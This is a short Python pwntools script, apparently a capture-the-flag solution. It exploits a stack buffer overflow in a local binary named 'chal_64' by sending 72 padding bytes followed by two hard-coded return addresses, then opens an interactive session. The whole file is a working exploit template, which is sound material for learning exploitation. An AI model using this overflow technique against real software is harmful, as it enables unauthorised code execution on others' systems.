from pwn import *

io = process("./chal_64")

rop = ROP("./chal_64")

payload = b'A'*72 + p64(0x0000000000401016) + p64(0x0000000000401156)

io.sendline(payload)
io.interactive()
